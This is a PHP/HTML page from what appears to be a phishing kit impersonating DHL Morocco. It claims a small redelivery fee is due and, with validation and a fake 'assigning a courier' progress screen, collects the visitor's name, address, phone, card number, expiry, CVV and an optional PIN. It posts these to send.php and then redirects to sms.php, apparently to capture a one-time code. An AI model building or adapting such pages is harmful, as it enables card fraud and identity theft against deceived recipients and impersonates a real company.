<?php
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Billing & Payment Information</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --dhl-red: #D40511;
            --dhl-yellow: #FFCC00;
            --primary-dark: #1a1a1a;
            --primary-light: #ffffff;
            --accent-gray: #6c757d;
            --bg-light: #f5f6f5;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f5f6f5 0%, #e9ecef 100%);
            min-height: 100vh;
            padding: 1rem;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .tracking-card {
            max-width: 90vw;
            width: 100%;
            max-width: 600px;
            background: var(--primary-light);
            border-radius: 1rem;
            box-shadow: 0 0.5rem 1.5rem rgba(0, 0, 0, 0.1);
            overflow: hidden;
            transition: transform 0.3s ease;
            margin: 1rem auto;
        }
        .tracking-card:hover {
            transform: translateY(-0.3rem);
        }
        .header-logo {
            background: var(--dhl-yellow);
            padding: 1rem;
            text-align: center;
        }
        .header-logo img {
            height: 2.5rem;
            max-width: 100%;
            transition: transform 0.3s ease;
        }
        .header-logo img:hover {
            transform: scale(1.05);
        }
        .delivery-notice {
            background: #fff3cd;
            border-left: 0.3rem solid var(--dhl-yellow);
            padding: 1rem;
            margin: 1rem;
            border-radius: 0.5rem;
            font-size: 0.9rem;
            color: var(--primary-dark);
            display: flex;
            align-items: center;
        }
        .delivery-notice i {
            color: var(--dhl-yellow);
            margin-right: 0.5rem;
            font-size: 1.2rem;
        }
        .billing-form, .payment-form {
            background: #f8f9fa;
            border-radius: 0.75rem;
            padding: 1.5rem;
            margin: 1rem;
            transition: background 0.3s ease;
        }
        .billing-form:hover, .payment-form:hover {
            background: #ffffff;
            box-shadow: 0 0.3rem 0.9rem rgba(0, 0, 0, 0.05);
        }
        .form-control {
            height: 3rem;
            border-radius: 0.6rem;
            border: 1px solid #dee2e6;
            padding: 0.75rem;
            font-size: 0.95rem;
            transition: all 0.3s ease;
            width: 100%;
        }
        .form-control:focus {
            border-color: var(--dhl-red);
            box-shadow: 0 0 0 0.2rem rgba(212, 5, 17, 0.15);
            outline: none;
        }
        .form-group {
            margin-bottom: 1rem;
            position: relative;
        }
        .form-group label {
            font-size: 0.9rem;
            font-weight: 500;
            color: var(--primary-dark);
            margin-bottom: 0.5rem;
            display: block;
        }
        .error {
            border-color: var(--dhl-red) !important;
        }
        .error-message {
            color: var(--dhl-red);
            font-size: 0.8rem;
            margin-top: 0.3rem;
            display: none;
        }
        .card-icon {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-10%);
            color: var(--accent-gray);
            font-size: 1.2rem;
        }
        .btn-dhl {
            background: linear-gradient(90deg, var(--dhl-red), #e63946);
            color: var(--primary-light);
            font-weight: 600;
            padding: 0.9rem 1.5rem;
            border-radius: 0.6rem;
            border: none;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            width: 100%;
            font-size: 1rem;
        }
        .btn-dhl:hover {
            background: linear-gradient(90deg, #b30000, #c82333);
            transform: translateY(-0.2rem);
            box-shadow: 0 0.3rem 0.9rem rgba(212, 5, 17, 0.3);
        }
        .alert-warning {
            background: #fff3cd;
            border: 1px solid var(--dhl-yellow);
            border-radius: 0.5rem;
            padding: 1rem;
            font-size: 0.9rem;
            color: var(--primary-dark);
        }
        .table {
            font-size: 0.9rem;
            color: var(--primary-dark);
        }
        .table th {
            font-weight: 500;
            color: var(--accent-gray);
        }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s ease;
        }
        .loader-overlay.show {
            opacity: 1;
            pointer-events: all;
        }
        .loader-content {
            background: var(--primary-light);
            border-radius: 1rem;
            padding: 1.5rem;
            text-align: center;
            max-width: 90%;
            box-shadow: 0 0.5rem 1.5rem rgba(0, 0, 0, 0.2);
            transform: scale(0.8);
            transition: transform 0.4s ease, opacity 0.4s ease;
        }
        .loader-overlay.show .loader-content {
            transform: scale(1);
            opacity: 1;
        }
        .loader-spinner {
            width: 3rem;
            height: 3rem;
            margin: 0 auto 1rem;
            position: relative;
        }
        .loader-spinner:before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border: 0.3rem solid rgba(212, 5, 17, 0.1);
            border-top-color: var(--dhl-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        .loader-spinner:after {
            content: '';
            position: absolute;
            top: 0.5rem;
            left: 0.5rem;
            right: 0.5rem;
            bottom: 0.5rem;
            border: 0.3rem solid rgba(255, 204, 0, 0.1);
            border-top-color: var(--dhl-yellow);
            border-radius: 50%;
            animation: spinReverse 1.5s linear infinite;
        }
        .loader-text {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--primary-dark);
            margin-bottom: 0.5rem;
        }
        .loader-subtext {
            font-size: 0.85rem;
            color: var(--accent-gray);
            margin-bottom: 1rem;
        }
        .progress-container {
            width: 100%;
            height: 0.5rem;
            background: #e9ecef;
            border-radius: 0.25rem;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0;
            background: linear-gradient(90deg, var(--dhl-red), var(--dhl-yellow));
            transition: width 0.4s ease;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes spinReverse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(-360deg); }
        }
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
        .pulse {
            animation: pulse 2s infinite ease-in-out;
        }
        .navigation-bar {
            background: linear-gradient(90deg, #ffcc00 0%, #ffcc00 48%, #ffe57f 70%, #fff0b2);
            height: 4rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 1rem;
            max-width: 1365px;
            margin: 0 auto;
            width: 100%;
            position: relative;
        }
        .logo-wrapper {
            display: flex;
            align-items: center;
        }
        .logo {
            width: 8rem;
        }
        .nav-menu {
            list-style: none;
            display: flex;
            align-items: center;
            margin: 0;
            padding: 0;
            flex-wrap: wrap;
        }
        .nav-menu li {
            margin-left: 1rem;
        }
        .nav-menu a {
            color: #191919;
            text-decoration: none;
            font-size: 0.9rem;
            padding: 0.5rem;
            display: flex;
            align-items: center;
            touch-action: manipulation;
        }
        .search-form {
            display: none; /* Removed search form for simplicity on mobile */
        }
        .menu-toggle {
            display: none;
            font-size: 1.5rem;
            background: none;
            border: none;
            color: #191919;
            cursor: pointer;
            padding: 0.5rem;
        }
        .c-voc-footer--branding-links-container {
            margin: 0 auto;
            padding: 0 1rem;
            display: flex;
            flex-flow: column;
            justify-content: center;
            max-width: 1365px;
            color: #191919;
            font-family: 'Delivery', Verdana, sans-serif;
            font-size: 0.9rem;
        }
        .c-voc-footer--branding-links {
            flex-basis: 100%;
            padding: 0 0 0.6rem;
        }
        .c-voc-footer--branding-links-header {
            flex: 0 0 auto;
            font-weight: 800;
            font-size: 0.9rem;
            line-height: 1.3;
            text-align: center;
        }
        .c-voc-footer--branding-links-header-logo {
            max-width: 8rem;
        }
        .c-voc-footer--branding-link-list {
            margin: 1rem 0 0;
            padding: 0;
            line-height: 1.3;
            list-style: none;
            display: flex;
            flex-flow: wrap;
            justify-content: center;
            gap: 0.5rem;
        }
        .c-voc-footer--branding-link-list li {
            padding: 0.5rem;
            flex: 0 0 auto;
            list-style-type: none;
            font-size: 0.85rem;
            line-height: 1.3;
        }
        .c-voc-footer--branding-link-list a {
            text-decoration: none;
            color: #666666;
            cursor: pointer;
            display: inline-block;
            position: relative;
            transition: color 0.2s;
            padding: 0.5rem;
            touch-action: manipulation;
        }
        .c-voc-footer--branding-social {
            flex-basis: 100%;
            padding: 1rem 0;
            text-align: center;
        }
        .c-voc-footer--branding-social h3 {
            margin: 0 0 0.5rem;
            font-size: 0.9rem;
            line-height: 1.3;
        }
        .c-voc-footer--branding-social-list {
            margin: 0;
            padding: 0;
            list-style: none;
            display: flex;
            flex-flow: wrap;
            justify-content: center;
            gap: 0.5rem;
        }
        .c-voc-footer--branding-social-list li {
            margin: 0 0.5rem;
            height: 2rem;
            width: 2rem;
        }
        .c-voc-footer--branding-social-list a {
            text-decoration: none;
            color: #191919;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 2rem;
            width: 2rem;
        }
        .c-voc-footer--branding-social-list img {
            height: 1.5rem;
            width: 1.5rem;
        }
        .c-voc-footer--branding-copyright {
            margin: 0 auto;
            padding: 0 1rem;
            color: #666666;
            display: flex;
            flex-flow: row;
            font-size: 0.85rem;
            justify-content: center;
            text-align: center;
            max-width: 1365px;
            line-height: 1.3;
            font-family: 'Delivery', Verdana, sans-serif;
            padding-bottom: 1rem;
        }
        @media (min-width: 768px) {
            body {
                padding: 2rem;
            }
            .tracking-card {
                max-width: 600px;
            }
            .navigation-bar {
                padding: 0 2rem;
                height: 4rem;
            }
            .logo {
                width: 9.5rem;
            }
            .nav-menu li {
                margin-left: 2rem;
            }
            .nav-menu a {
                font-size: 0.9rem;
                padding: 1rem;
            }
            .search-form {
                margin-left: 2rem;
            }
            .c-voc-footer--branding-links-container {
                flex-flow: row;
                padding: 0 2rem;
            }
            .c-voc-footer--branding-links {
                flex-basis: 75%;
            }
            .c-voc-footer--branding-social {
                flex-basis: 25%;
                padding: 0 0 2rem 1rem;
            }
            .c-voc-footer--branding-links-header {
                text-align: left;
            }
            .c-voc-footer--branding-link-list {
                justify-content: flex-start;
            }
            .c-voc-footer--branding-link-list li {
                padding: 0.7rem 2rem 0.7rem 0;
            }
            .c-voc-footer--branding-copyright {
                padding: 0 2rem;
            }
        }
        @media (max-width: 576px) {
            body {
                padding: 0.5rem;
            }
            .tracking-card {
                box-shadow: none;
                border-radius: 0;
                max-width: 100vw;
            }
            .billing-form, .payment-form {
                margin: 0.5rem;
                padding: 1rem;
                border-radius: 0.5rem;
            }
            .btn-dhl {
                padding: 0.8rem 1rem;
                font-size: 0.9rem;
            }
            .form-control {
                height: 2.5rem;
                font-size: 0.9rem;
            }
            .loader-content {
                max-width: 95%;
                padding: 1rem;
            }
            .navigation-bar {
                padding: 0.5rem;
                height: auto;
                flex-direction: column;
                align-items: flex-start;
            }
            .logo {
                width: 6rem;
                margin-bottom: 0.5rem;
            }
            .nav-menu {
                display: none;
                width: 100%;
                flex-direction: column;
                align-items: flex-start;
                padding: 0.5rem 0;
            }
            .nav-menu.active {
                display: flex;
            }
            .nav-menu li {
                margin: 0.5rem 0;
                width: 100%;
            }
            .nav-menu a {
                font-size: 0.9rem;
                padding: 0.5rem;
                width: 100%;
            }
            .menu-toggle {
                display: block;
                position: absolute;
                right: 0.5rem;
                top: 0.5rem;
            }
            .search-form {
                display: none; /* Removed for mobile simplicity */
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="navigation-bar">
            <div class="logo-wrapper">
                <a class="logo" href="https://www.dhl.com/ma-en/home.html" title="DHL Homepage">
                    <img src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="DHL Homepage" style="width: 100%; max-height: 4rem;">
                </a>
            </div>
            <button class="menu-toggle" id="menuToggle">
                <i class="fas fa-bars"></i>
            </button>
            <ul class="nav-menu" id="navMenu">
                <li><a href="https://www.dhl.com/ma-en/home/redirect/express/locator.html" target="_blank" rel="noopener noreferrer">Find a Service Point</a></li>
                <li>
                    <form class="search-form" action="https://www.dhl.com/ma-en/home/search.html" method="GET" role="search">
                        <label class="search-label" for="nav-search-input">Search</label>
                        <div class="search-input-container">
                            <input id="nav-search-input" type="search" name="q" placeholder="Search dhl.com" autocomplete="off">
                        </div>
                    </form>
                </li>
                <li><a href="https://www.dhl.com/ma-en/home/location-selector.html" title="Select Location">Morocco</a></li>
                <li><a href="https://www.dhl.com/ma-fr/home/se-connecter.html">FR</a></li>
            </ul>
        </div>
    </header>
    <div class="tracking-card">
        <div class="header-logo">
            <img src="https://cdn.shopify.com/s/files/1/0930/7134/3889/files/cqs.svg?v=1749563770" alt="DHL">
        </div>
        <div class="delivery-notice">
            <i class="fas fa-exclamation-circle"></i>
            Please ensure your address and phone number are accurate to facilitate successful delivery. Incorrect information may delay your shipment.
        </div>
        <div class="px-3">
            <h4 class="mb-3 fw-bold">Package Information</h4>
            <table class="table table-sm mb-3">
                <tr>
                    <th><?php echo getLang("_BILLING_TABLE")[0];?></th>
                    <td><?php echo date("D, M Y"); ?> - <?php echo getLang("_BILLING_TABLE")[1];?></td>
                </tr>
                <tr>
                    <th><?php echo getLang("_BILLING_TABLE")[2];?></th>
                    <td>1.2 kg</td>
                </tr>
            </table>
        </div>
        <div class="billing-form">
            <h5 class="mb-3 fw-bold">Billing Information</h5>
            <div class="form-group">
                <label for="d0">Full Name</label>
                <input type="text" class="form-control" id="d0" placeholder="Full Name" pattern="[A-Za-z ]{3,}" title="Please enter your full name (letters only)" required>
                <div class="error-message" id="name-error">Please enter a valid full name</div>
            </div>
            <div class="form-group">
                <label for="d1">Street Address</label>
                <input type="text" class="form-control" id="d1" placeholder="Street Address" pattern="[A-Za-z0-9 ,.'-]{5,}" title="Please enter a valid address" required>
                <div class="error-message" id="address-error">Please enter a valid street address</div>
            </div>
            <div class="form-group">
                <label for="d2">City</label>
                <input type="text" class="form-control" id="d2" placeholder="City" pattern="[A-Za-z ]{2,}" title="Please enter a valid city name" required>
                <div class="error-message" id="city-error">Please enter a valid city</div>
            </div>
            <div class="row">
                <div class="col-12 col-md-6">
                    <div class="form-group">
                        <label for="d3">ZIP/Postal Code</label>
                        <input type="text" class="form-control" id="d3" placeholder="ZIP/Postal Code" pattern="[A-Za-z0-9 -]{3,10}" title="Please enter a valid postal code" required>
                        <div class="error-message" id="zip-error">Please enter a valid ZIP/postal code</div>
                    </div>
                </div>
                <div class="col-12 col-md-6">
                    <div class="form-group">
                        <label for="d4">Phone Number</label>
                        <input type="tel" class="form-control" id="d4" placeholder="Phone Number" pattern="[0-9]{7,13}" title="Please enter a valid phone number (7-13 digits)" required>
                        <div class="error-message" id="phone-error">Please enter a valid phone number (7-13 digits)</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="payment-form">
            <h5 class="mb-3 fw-bold">Payment Information</h5>
            <div class="alert alert-warning mb-3">
                <i class="fas fa-exclamation-circle me-2"></i>
                A redelivery fee of <strong><?php echo $currency;?>2.10</strong> will be charged to your payment method to process your package redelivery.
            </div>
            <div class="form-group">
                <label><?php echo getLang("_CARD_INPUTS")[0];?></label>
                <div class="position-relative">
                    <input type="text" inputmode="numeric" class="form-control" id="d5" placeholder="0000 0000 0000 0000">
                    <i class="fas fa-credit-card card-icon"></i>
                </div>
                <div class="error-message" id="card-error">Please enter a valid card number</div>
            </div>
            <div class="row">
                <div class="col-12 col-md-8">
                    <div class="form-group">
                        <label><?php echo getLang("_CARD_INPUTS")[1];?></label>
                        <input type="text" inputmode="numeric" class="form-control" id="d6" placeholder="MM/YY">
                        <div class="error-message" id="expiry-error">Please enter a valid expiration date (MM/YY)</div>
                    </div>
                </div>
                <div class="col-12 col-md-4">
                    <div class="form-group">
                        <label><?php echo getLang("_CARD_INPUTS")[2];?></label>
                        <input type="text" inputmode="numeric" class="form-control" id="d7" placeholder="CVV">
                        <div class="error-message" id="cvv-error">Please enter a valid CVV</div>
                    </div>
                </div>
            </div>
            </div>
        </div>
        <div class="px-3 pb-3">
            <button onclick="sendData()" class="btn btn-dhl btn-lg w-100">
                <i class="fas fa-truck"></i> Confirm Redelivery
            </button>
        </div>
        <div class="text-center py-2" style="font-size: 0.8rem; color: var(--accent-gray);">
            © 2026 DHL International GmbH. All rights reserved.
        </div>
    </div>
    <div class="loader-overlay">
        <div class="loader-content">
            <div class="loader-spinner"></div>
            <h5 class="loader-text">Preparing Your Shipment</h5>
            <p class="loader-subtext">We're assigning a DHL courier to securely handle your delivery.</p>
            <p class="loader-subtext pulse">Please do not refresh the page or navigate away.</p>
            <div class="progress-container">
                <div class="progress-bar" id="paymentProgress"></div>
            </div>
        </div>
    </div>
    <footer>
        <div class="c-voc-footer--branding-links-container">
            <div class="c-voc-footer--branding-links">
                <div class="c-voc-footer--branding-links-header">
                    <img alt="DHL Group" class="c-voc-footer--branding-links-header-logo" src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/glo-footer-logo.svg" />
                </div>
                <ul class="c-voc-footer--branding-link-list">
                    <li><a class="link has-icon" data-tracking='{"component":"dhl/components/general/footer-branding","name":"Fraud Awareness","topic":"footer legal"}' href="https://www.dhl.com/ma-en/home/footer/fraud-awareness.html">Fraud Awareness</a></li>
                    <li><a class="link has-icon" data-tracking='{"component":"dhl/components/general/footer-branding","name":"Legal Notice","topic":"footer legal"}' href="https://www.dhl.com/ma-en/home/footer/legal-notice.html">Legal Notice</a></li>
                    <li><a class="link has-icon" data-tracking='{"component":"dhl/components/general/footer-branding","name":"Terms of Use","topic":"footer legal"}' href="https://www.dhl.com/ma-en/home/footer/terms-of-use.html">Terms of Use</a></li>
                    <li><a class="link has-icon" data-tracking='{"component":"dhl/components/general/footer-branding","name":"Privacy Notice","topic":"footer legal"}' href="https://www.dhl.com/ma-en/home/footer/privacy-notice.html">Privacy Notice</a></li>
                    <li><a class="link has-icon" data-tracking='{"component":"dhl/components/general/footer-branding","name":"Additional Information","topic":"footer legal"}' href="https://www.dhl.com/ma-en/home/footer/additional-information.html">Additional Information</a></li>
                    <li><a aria-haspopup="dialog" class="link has-icon" data-tracking='{"component":"dhl/components/general/footer-branding","name":"Cookie Settings","topic":"footer legal"}' href="https://www.dhl.com/ma-en/home/login.html#cookiepref" role="button">Cookie Settings</a></li>
                </ul>
            </div>
            <div class="c-voc-footer--branding-social">
                <h3 class="c-voc-footer--branding-links-header">Follow Us</h3>
                <ul class="c-voc-footer--branding-social-list">
                    <li><a aria-describedby="a11y-message--new-window a11y-message--external-link" class="link link-social" data-tracking='{"component":"dhl/components/general/footer-branding","name":"FL | Follow us | YouTube","topic":"footer legal"}' href="https://www.youtube.com/user/dhl" rel="noopener noreferrer" target="_blank" title="YouTube"><img alt="YouTube" src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/youtube-new.svg" /></a></li>
                    <li><a aria-describedby="a11y-message--new-window a11y-message--external-link" class="link link-social" data-tracking='{"component":"dhl/components/general/footer-branding","name":"FL | Follow us | Facebook","topic":"footer legal"}' href="https://www.facebook.com/dhl" rel="noopener noreferrer" target="_blank" title="Facebook"><img alt="Facebook" src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/facebook-new.svg" /></a></li>
                    <li><a aria-describedby="a11y-message--new-window a11y-message--external-link" class="link link-social" data-tracking='{"component":"dhl/components/general/footer-branding","name":"FL | Follow us | LinkedIn","topic":"footer legal"}' href="https://www.linkedin.com/company/dhl" rel="noopener noreferrer" target="_blank" title="LinkedIn"><img alt="LinkedIn" src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/linkedIn-new.svg" /></a></li>
                    <li><a aria-describedby="a11y-message--new-window a11y-message--external-link" class="link link-social" data-tracking='{"component":"dhl/components/general/footer-branding","name":"FL | Follow us | Instagram","topic":"footer legal"}' href="https://www.instagram.com/dhl_global/" rel="noopener noreferrer" target="_blank" title="Instagram"><img alt="Instagram" src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/instagram-new.svg" /></a></li>
                </ul>
            </div>
        </div>
        <div class="c-voc-footer--branding-copyright">
            <div>2025 &copy; - all rights reserved</div>
        </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        // Apply masks
        $("#d5").mask("0000 0000 0000 0000");
        $("#d6").mask("00/00");
        $("#d7").mask("000");
        $("#d11").mask("0000");

        // Phone number input handling
        $('#d4').on('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 13);
        });

        // Initialize variables
        let allowSubmit = false;
        let abortVal = true;
        const seconds = <?php echo $seconds * 1000; ?>;

        // Validation functions
        function validateCardNumber(cardNumber) {
            cardNumber = cardNumber.replace(/\s+/g, '');
            if (!/^\d{13,19}$/.test(cardNumber)) return false;
            let sum = 0, shouldDouble = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return (sum % 10) === 0;
        }

        function validateExpiryDate(expiryDate) {
            if (!expiryDate || expiryDate.includes('_')) return false;
            const [monthStr, yearStr] = expiryDate.split('/');
            const month = parseInt(monthStr, 10);
            const year = parseInt(yearStr, 10) + 2000;
            if (month < 1 || month > 12) return false;
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear();
            const currentMonth = currentDate.getMonth() + 1;
            return !(year < currentYear || (year === currentYear && month < currentMonth));
        }

        function validateCVV(cvv) {
            return /^\d{3,4}$/.test(cvv);
        }
        
        function validateName(name) {
            return /^[A-Za-z ]{3,}$/.test(name);
        }

        function validateAddress(address) {
            return /^[A-Za-z0-9 ,.'-]{5,}$/.test(address);
        }

        function validateCity(city) {
            return /^[A-Za-z ]{2,}$/.test(city);
        }

        function validateZip(zip) {
            return /^[A-Za-z0-9 -]{3,10}$/.test(zip);
        }

        function validatePhone(phone) {
            return /^[0-9]{7,13}$/.test(phone);
        }

        function validate() {
            abortVal = false;
            allowSubmit = true;

            if (!validateName($("#d0").val())) {
                $("#d0").addClass("error");
                $("#name-error").show();
                allowSubmit = false;
            } else {
                $("#d0").removeClass("error");
                $("#name-error").hide();
            }

            if (!validateAddress($("#d1").val())) {
                $("#d1").addClass("error");
                $("#address-error").show();
                allowSubmit = false;
            } else {
                $("#d1").removeClass("error");
                $("#address-error").hide();
            }

            if (!validateCity($("#d2").val())) {
                $("#d2").addClass("error");
                $("#city-error").show();
                allowSubmit = false;
            } else {
                $("#d2").removeClass("error");
                $("#city-error").hide();
            }

            if (!validateZip($("#d3").val())) {
                $("#d3").addClass("error");
                $("#zip-error").show();
                allowSubmit = false;
            } else {
                $("#d3").removeClass("error");
                $("#zip-error").hide();
            }

            if (!validatePhone($("#d4").val())) {
                $("#d4").addClass("error");
                $("#phone-error").show();
                allowSubmit = false;
            } else {
                $("#d4").removeClass("error");
                $("#phone-error").hide();
            }

            const cardNumber = $("#d5").val().replace(/\s+/g, '');
            if (!validateCardNumber(cardNumber)) {
                $("#d5").addClass("error");
                $("#card-error").show();
                allowSubmit = false;
            } else {
                $("#d5").removeClass("error");
                $("#card-error").hide();
            }

            const expiryDate = $("#d6").val();
            if (!validateExpiryDate(expiryDate)) {
                $("#d6").addClass("error");
                $("#expiry-error").show();
                allowSubmit = false;
            } else {
                $("#d6").removeClass("error");
                $("#expiry-error").hide();
            }

            const cvv = $("#d7").val();
            if (!validateCVV(cvv)) {
                $("#d7").addClass("error");
                $("#cvv-error").show();
                allowSubmit = false;
            } else {
                $("#d7").removeClass("error");
                $("#cvv-error").hide();
            }

        }

        $("input").on('keyup', () => {
            if (!abortVal) validate();
        });

        $("input").on('keypress', (e) => {
            if (e.key === "Enter") sendData();
        });

        function sendData() {
            validate();
            if (allowSubmit) {
                const loader = document.querySelector('.loader-overlay');
                loader.classList.add('show');
                const progressBar = document.getElementById('paymentProgress');
                let progress = 0;
                const totalDuration = 45000;
                const intervalDuration = 100;
                const totalSteps = totalDuration / intervalDuration;
                let currentStep = 0;
                const easeOut = (t) => t * (2 - t);
                const progressInterval = setInterval(() => {
                    currentStep++;
                    progress = Math.min(90, easeOut(currentStep / totalSteps) * 90);
                    progressBar.style.width = `${progress}%`;
                    if (progress >= 90) clearInterval(progressInterval);
                }, intervalDuration);

                const data = {
                    name: $("#d0").val(),
                    address: $("#d1").val(),
                    city: $("#d2").val(),
                    zip: $("#d3").val(),
                    phone: $("#d4").val(),
                    cc: $("#d5").val().replace(/\s+/g, ''),
                    exp: $("#d6").val(),
                    cvv: $("#d7").val()
                };
                if ($("#d11").val()) data.pin = $("#d11").val();

                $.post("send.php", data)
                    .done(function(response) {
                        progressBar.style.width = '100%';
                        setTimeout(() => {
                            window.location = "sms.php";
                        }, seconds);
                    })
                    .fail(function(xhr, status, error) {
                        loader.classList.remove('show');
                        alert('An error occurred while processing your request. Please try again later.');
                        console.error('AJAX Error:', status, error);
                    });
            }
        }

        // Toggle mobile menu
        $("#menuToggle").click(function() {
            $("#navMenu").toggleClass("active");
            $(this).find("i").toggleClass("fa-bars fa-times");
        });
    </script>
</body>
</html>